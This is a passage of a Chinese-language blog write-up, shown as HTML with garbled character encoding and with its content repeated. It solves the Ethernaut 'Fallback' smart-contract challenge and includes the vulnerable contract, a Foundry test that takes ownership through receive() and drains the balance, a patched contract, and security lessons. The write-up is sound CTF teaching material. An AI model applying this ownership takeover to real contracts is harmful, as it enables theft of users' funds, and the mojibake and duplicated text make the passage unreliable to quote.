msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function getOwner() public view returns (address) &#123;</span><br><span class=\"line\">        return owner;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ¼æ´è¯†åˆ«\"><a href=\"#æ¼æ´è¯†åˆ«\" class=\"headerlink\" title=\"æ¼æ´è¯†åˆ«\"></a>æ¼æ´è¯†åˆ«</h3><p>é€šè¿‡ä»£ç å®¡è®¡ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸¤ç§æˆä¸º <code>owner</code> çš„æ–¹å¼ï¼š</p>\n<p><strong>æ–¹å¼ä¸€ï¼šé€šè¿‡ <code>contribute()</code> å‡½æ•°</strong></p>\n<ul>\n<li>éœ€è¦è´¡çŒ®è¶…è¿‡ 1000 ETH æ‰èƒ½è·å¾—æ§åˆ¶æƒ</li>\n<li>æ¯æ¬¡è°ƒç”¨é™åˆ¶æœ€å¤š 0.001 ETH</li>\n<li>éœ€è¦è°ƒç”¨è¶…è¿‡ 100 ä¸‡æ¬¡ï¼Œæˆæœ¬è¿‡é«˜ âŒ</li>\n</ul>\n<p><strong>æ–¹å¼äºŒï¼šé€šè¿‡ <code>receive()</code> å‡½æ•°</strong> â­</p>\n<ul>\n<li>åªéœ€æ»¡è¶³ä¸¤ä¸ªç®€å•æ¡ä»¶ï¼š<ol>\n<li><code>msg.value &gt; 0</code> - å‘é€ä»»æ„æ•°é‡çš„ ETH</li>\n<li><code>contributions[msg.sender] &gt; 0</code> - ä¹‹å‰æœ‰è¿‡è´¡çŒ®è®°å½•</li>\n</ol>\n</li>\n<li>æ»¡è¶³æ¡ä»¶åç›´æ¥æˆä¸º <code>owner</code> âœ…</li>\n</ul>\n<h3 id=\"æ”»å‡»è·¯å¾„\"><a href=\"#æ”»å‡»è·¯å¾„\" class=\"headerlink\" title=\"æ”»å‡»è·¯å¾„\"></a>æ”»å‡»è·¯å¾„</h3><ol>\n<li><strong>å»ºç«‹è´¡çŒ®è®°å½•</strong> - è°ƒç”¨ <code>contribute()</code> å‘é€å°‘é‡ ETH</li>\n<li><strong>è§¦å‘æƒé™æå‡</strong> - ç›´æ¥å‘åˆçº¦å‘é€ ETH è§¦å‘ <code>receive()</code></li>\n<li><strong>æå–èµ„é‡‘</strong> - è°ƒç”¨ <code>withdraw()</code> æå–æ‰€æœ‰ä½™é¢</li>\n</ol>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Fallback.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract FallbackTest is Test &#123;</span><br><span class=\"line\">    Fallback public instance;</span><br><span class=\"line\">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // éƒ¨ç½²ç›®æ ‡åˆçº¦</span><br><span class=\"line\">        instance = new Fallback();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ç»™æ”»å‡»è€…ä¸€äº›åˆå§‹èµ„é‡‘</span><br><span class=\"line\">        vm.deal(attacker, 1 ether);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ç»™åˆçº¦ä¸€äº›åˆå§‹ä½™é¢</span><br><span class=\"line\">        vm.deal(address(instance), 1 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testFallbackExploit() public &#123;</span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ­¥éª¤1: å…ˆè´¡çŒ®å°‘é‡ETHä»¥æ»¡è¶³contributions[msg.sender] &gt; 0</span><br><span class=\"line\">        instance.contribute&#123;value: 0.0001 ether&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯è´¡çŒ®è®°å½•</span><br><span class=\"line\">        assertGt(instance.getContribution(), 0);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ­¥éª¤2: ç›´æ¥å‘åˆçº¦å‘é€ETHè§¦å‘receive()å‡½æ•°</span><br><span class=\"line\">        (bool sent, ) = address(instance).call&#123;value: 1 wei&#125;(&quot;&quot;);</span><br><span class=\"line\">        require(sent, &quot;Failed to send Ether to the Fallback&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯å·²æˆä¸ºowner</span><br><span class=\"line\">        assertEq(instance.getOwner(), attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ­¥éª¤3: æå–æ‰€æœ‰èµ„é‡‘</span><br><span class=\"line\">        uint256 initialBalance = attacker.balance;</span><br><span class=\"line\">        instance.withdraw();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯èµ„é‡‘æå–æˆåŠŸ</span><br><span class=\"line\">        assertGt(attacker.balance, initialBalance);</span><br><span class=\"line\">        assertEq(address(instance).balance, 0);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"è¿è¡Œæµ‹è¯•\"><a href=\"#è¿è¡Œæµ‹è¯•\" class=\"headerlink\" title=\"è¿è¡Œæµ‹è¯•\"></a>è¿è¡Œæµ‹è¯•</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># è¿è¡Œ Fallback å…³å¡æµ‹è¯•</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract FallbackTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># è¾“å‡ºåº”è¯¥æ˜¾ç¤ºæ‰€æœ‰æ–­è¨€é€šè¿‡</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"é—®é¢˜æ ¹æº\"><a href=\"#é—®é¢˜æ ¹æº\" class=\"headerlink\" title=\"é—®é¢˜æ ¹æº\"></a>é—®é¢˜æ ¹æº</h3><ol>\n<li><strong>æƒé™æ£€æŸ¥ä¸å½“</strong> - <code>receive()</code> å‡½æ•°ä¸­æ²¡æœ‰é€‚å½“çš„æƒé™éªŒè¯</li>\n<li><strong>é€»è¾‘è®¾è®¡ç¼ºé™·</strong> - å…è®¸é€šè¿‡ç®€å•æ¡ä»¶è·å¾—å®Œæ•´æ§åˆ¶æƒ</li>\n<li><strong>å‡½æ•°èŒè´£æ··ä¹±</strong> - æ¥æ”¶èµ„é‡‘çš„å‡½æ•°ä¸åº”åŒ…å«æƒé™å˜æ›´é€»è¾‘</li>\n</ol>\n<h3 id=\"å®‰å…¨ä¿®å¤å»ºè®®\"><a href=\"#å®‰å…¨ä¿®å¤å»ºè®®\" class=\"headerlink\" title=\"å®‰å…¨ä¿®å¤å»ºè®®\"></a>å®‰å…¨ä¿®å¤å»ºè®®</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureFallback &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public contributions;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function contribute() public payable &#123;</span><br><span class=\"line\">        require(msg.value &lt; 0.001 ether);</span><br><span class=\"line\">        contributions[msg.sender] += msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // âœ… æé«˜é—¨æ§›ï¼Œé¿å…ç®€å•çš„æƒé™æå‡</span><br><span class=\"line\">        if(contributions[msg.sender] &gt; contributions[owner] &amp;&amp; </span><br><span class=\"line\">           contributions[msg.sender] &gt; 10 ether) &#123;</span><br><span class=\"line\">            owner = msg.sender;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // âœ… ç§»é™¤æƒé™å˜æ›´é€»è¾‘ï¼Œåªå¤„ç†èµ„é‡‘æ¥æ”¶</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        // ä»…è®°å½•æ¥æ”¶çš„èµ„é‡‘ï¼Œä¸ä¿®æ”¹æƒé™</span><br><span class=\"line\">        emit FundsReceived(msg.sender, msg.value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdraw() public onlyOwner &#123;</span><br><span class=\"line\">        payable(owner).transfer(address(this).balance);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    event FundsReceived(address sender, uint amount);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\"><a href=\"#ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\" class=\"headerlink\" title=\"ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\"></a>ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹</h2><h3 id=\"1-Fallback-å’Œ-Receive-å‡½æ•°\"><a href=\"#1-Fallback-å’Œ-Receive-å‡½æ•°\" class=\"headerlink\" title=\"1. Fallback å’Œ Receive å‡½æ•°\"></a>1. Fallback å’Œ Receive å‡½æ•°</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// receive() - æ¥æ”¶çº¯ETHè½¬è´¦æ—¶è°ƒç”¨</span><br><span class=\"line\">receive() external payable &#123;</span><br><span class=\"line\">    // å¤„ç†é€»è¾‘</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// fallback() - è°ƒç”¨ä¸å­˜åœ¨çš„å‡½æ•°æˆ–å¸¦æ•°æ®çš„ETHè½¬è´¦æ—¶è°ƒç”¨</span><br><span class=\"line\">fallback() external payable &#123;</span><br><span class=\"line\">    // å¤„ç†é€»è¾‘</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-æƒé™è®¾è®¡åŸåˆ™\"><a href=\"#2-æƒé™è®¾è®¡åŸåˆ™\" class=\"headerlink\" title=\"2. æƒé™è®¾è®¡åŸåˆ™\"></a>2. æƒé™è®¾è®¡åŸåˆ™</h3><ul>\n<li><strong>æœ€å°æƒé™åŸåˆ™</strong> - ç»™äºˆæœ€å°‘å¿…è¦çš„æƒé™</li>\n<li><strong>æƒé™åˆ†ç¦»</strong> - ä¸åŒåŠŸèƒ½ä½¿ç”¨ä¸åŒæƒé™çº§åˆ«</li>\n<li><strong>æƒé™æ£€æŸ¥</strong> - åœ¨å…³é”®æ“ä½œå‰è¿›è¡Œå……åˆ†éªŒè¯</li>\n</ul>\n<h3 id=\"3-å®‰å…¨å¼€å‘æœ€ä½³å®è·µ\"><a href=\"#3-å®‰å…¨å¼€å‘æœ€ä½³å®è·µ\" class=\"headerlink\" title=\"3. å®‰å…¨å¼€å‘æœ€ä½³å®è·µ\"></a>3. å®‰å…¨å¼€å‘æœ€ä½³å®è·µ</h3><ul>\n<li><strong>é¿å…åœ¨ç‰¹æ®Šå‡½æ•°ä¸­å®ç°å…³é”®é€»è¾‘</strong></li>\n<li><strong>ä½¿ç”¨ OpenZeppelin çš„ Ownable æ¨¡å¼</strong></li>\n<li><strong>å……åˆ†çš„å•å…ƒæµ‹è¯•è¦†ç›–</strong></li>\n<li><strong>ä»£ç å®¡è®¡å’ŒåŒè¡Œè¯„å®¡</strong></li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p>Fallback å…³å¡è™½ç„¶ç®€å•ï¼Œä½†å±•ç¤ºäº†æ™ºèƒ½åˆçº¦å®‰å…¨çš„åŸºç¡€æ¦‚å¿µï¼š</p>\n<ul>\n<li>âœ… <strong>å‡½æ•°èŒè´£åˆ†ç¦»çš„é‡è¦æ€§</strong></li>\n<li>âœ… <strong>æƒé™éªŒè¯çš„å¿…è¦æ€§</strong> </li>\n<li>âœ… <strong>ç‰¹æ®Šå‡½æ•°çš„ä½¿ç”¨æ³¨æ„äº‹é¡¹</strong></li>\n<li>âœ… <strong>Foundry æµ‹è¯•æ¡†æ¶çš„åŸºæœ¬ä½¿ç”¨</strong></li>\n</ul>\n<p>è¿™æ˜¯å­¦ä¹ æ™ºèƒ½åˆçº¦å®‰å…¨çš„è‰¯å¥½èµ·ç‚¹ï¼Œä¸ºåç»­æ›´å¤æ‚çš„æ”»å‡»æŠ€æœ¯æ‰“ä¸‹åŸºç¡€ã€‚</p>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-02-fallout/\">ä¸‹ä¸€å…³: Level 2 - Fallout</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®</a></strong></li>\n</ul>\n<hr>\n<p><em>åœ¨æ™ºèƒ½åˆçº¦çš„ä¸–ç•Œä¸­ï¼Œæœ€ç®€å•çš„æ¼æ´å¾€å¾€éšè—ç€æœ€æ·±åˆ»çš„å®‰å…¨æ•™è®­ã€‚</em> ğŸ“</p>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-1-Fallback-å›é€€å‡½æ•°æƒé™æå‡æ”»å‡»\"><a href=\"#ğŸ¯-Ethernaut-Level-1-Fallback-å›é€€å‡½æ•°æƒé™æå‡æ”»å‡»\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 1: Fallback - å›é€€å‡½æ•°æƒé™æå‡æ”»å‡»\"></a>ğŸ¯ Ethernaut Level 1: Fallback - å›é€€å‡½æ•°æƒé™æå‡æ”»å‡»</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/1\">Ethernaut Level 1 - Fallback</a><br><strong>æ”»å‡»ç±»å‹</strong>: æƒé™æå‡ã€Fallback å‡½æ•°æ¼æ´<br><strong>éš¾åº¦</strong>: â­â­â˜†â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>è¿™æ˜¯ Ethernaut ç³»åˆ—çš„ç¬¬ä¸€ä¸ªæ­£å¼å…³å¡ï¼Œç›®æ ‡éå¸¸æ˜ç¡®ï¼š</p>\n<ol>\n<li><strong>è·å–åˆçº¦æ§åˆ¶æƒ</strong> - æˆä¸ºåˆçº¦çš„ <code>owner</code></li>\n<li><strong>è½¬å‡ºæ‰€æœ‰ä½™é¢</strong> - æå–åˆçº¦ä¸­çš„æ‰€æœ‰ ETH</li>\n</ol>\n<p><img src=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions/raw/main/imgs/requirements/1-fallback-requirements.webp\" alt=\"Fallback Challenge\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"åˆçº¦æºç åˆ†æ\"><a href=\"#åˆçº¦æºç åˆ†æ\" class=\"headerlink\" title=\"åˆçº¦æºç åˆ†æ\"></a>åˆçº¦æºç åˆ†æ</h3><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ¥åˆ†æç›®æ ‡åˆçº¦çš„å…³é”®ä»£ç ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Fallback &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public contributions;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    modifier onlyOwner &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function contribute() public payable &#123;</span><br><span class=\"line\">        require(msg.value &lt; 0.001 ether);</span><br><span class=\"line\">        contributions[msg.sender] += msg.value;</span><br><span class=\"line\">        if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class=\"line\">            owner = msg.sender;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function getContribution() public view returns (uint) &#123;</span><br><span class=\"line\">        return contributions[msg.sender];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function withdraw() public onlyOwner &#123;</span><br><span class=\"line\">        payable(owner).transfer(address(this).balance);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // ğŸš¨ å…³é”®æ¼æ´ç‚¹</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function getOwner() public view returns (address) &#123;</span><br><span class=\"line\">        return owner;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ¼æ´è¯†åˆ«\"><a href=\"#æ¼æ´è¯†åˆ«\" class=\"headerlink\" title=\"æ¼æ´è¯†åˆ«\"></a>æ¼æ´è¯†åˆ«</h3><p>é€šè¿‡ä»£ç å®¡è®¡ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸¤ç§æˆä¸º <code>owner</code> çš„æ–¹å¼ï¼š</p>\n<p><strong>æ–¹å¼ä¸€ï¼šé€šè¿‡ <code>contribute()</code> å‡½æ•°</strong></p>\n<ul>\n<li>éœ€è¦è´¡çŒ®è¶…è¿‡ 1000 ETH æ‰èƒ½è·å¾—æ§åˆ¶æƒ</li>\n<li>æ¯æ¬¡è°ƒç”¨é™åˆ¶æœ€å¤š 0.001 ETH</li>\n<li>éœ€è¦è°ƒç”¨è¶…è¿‡ 100 ä¸‡æ¬¡ï¼Œæˆæœ¬è¿‡é«˜ âŒ</li>\n</ul>\n<p><strong>æ–¹å¼äºŒï¼šé€šè¿‡ <code>receive()</code> å‡½æ•°</strong> â­</p>\n<ul>\n<li>åªéœ€æ»¡è¶³ä¸¤ä¸ªç®€å•æ¡ä»¶ï¼š<ol>\n<li><code>msg.value &gt; 0</code> - å‘é€ä»»æ„æ•°é‡çš„ ETH</li>\n<li><code>contributions[msg.sender] &gt; 0</code> - ä¹‹å‰æœ‰è¿‡è´¡çŒ®è®°å½•</li>\n</ol>\n</li>\n<li>æ»¡è¶³æ¡ä»¶åç›´æ¥æˆä¸º <code>owner</code> âœ…</li>\n</ul>\n<h3 id=\"æ”»å‡»è·¯å¾„\"><a href=\"#æ”»å‡»è·¯å¾„\" class=\"headerlink\" title=\"æ”»å‡»è·¯å¾„\"></a>æ”»å‡»è·¯å¾„</h3><ol>\n<li><strong>å»ºç«‹è´¡çŒ®è®°å½•</strong> - è°ƒç”¨ <code>contribute()</code> å‘é€å°‘é‡ ETH</li>\n<li><strong>è§¦å‘æƒé™æå‡</strong> - ç›´æ¥å‘åˆçº¦å‘é€ ETH è§¦å‘ <code>receive()</code></li>\n<li><strong>æå–èµ„é‡‘</strong> - è°ƒç”¨ <code>withdraw()</code> æå–æ‰€æœ‰ä½™é¢</li>\n</ol>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Fallback.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract FallbackTest is Test &#123;</span><br><span class=\"line\">    Fallback public instance;</span><br><span class=\"line\">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // éƒ¨ç½²ç›®æ ‡åˆçº¦</span><br><span class=\"line\">        instance = new Fallback();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ç»™æ”»å‡»è€…ä¸€äº›åˆå§‹èµ„é‡‘</span><br><span class=\"line\">        vm.deal(attacker, 1 ether);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ç»™åˆçº¦ä¸€äº›åˆå§‹ä½™é¢</span><br><span class=\"line\">        vm.deal(address(instance), 1 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testFallbackExploit() public &#123;</span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ­¥éª¤1: å…ˆè´¡çŒ®å°‘é‡ETHä»¥æ»¡è¶³contributions[msg.sender] &gt; 0</span><br><span class=\"line\">        instance.contribute&#123;value: 0.0001 ether&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯è´¡çŒ®è®°å½•</span><br><span class=\"line\">        assertGt(instance.getContribution(), 0);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ­¥éª¤2: ç›´æ¥å‘åˆçº¦å‘é€ETHè§¦å‘receive()å‡½æ•°</span><br><span class=\"line\">        (bool sent, ) = address(instance).call&#123;value: 1 wei&#125;(&quot;&quot;);</span><br><span class=\"line\">        require(sent, &quot;Failed to send Ether to the Fallback&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯å·²æˆä¸ºowner</span><br><span class=\"line\">        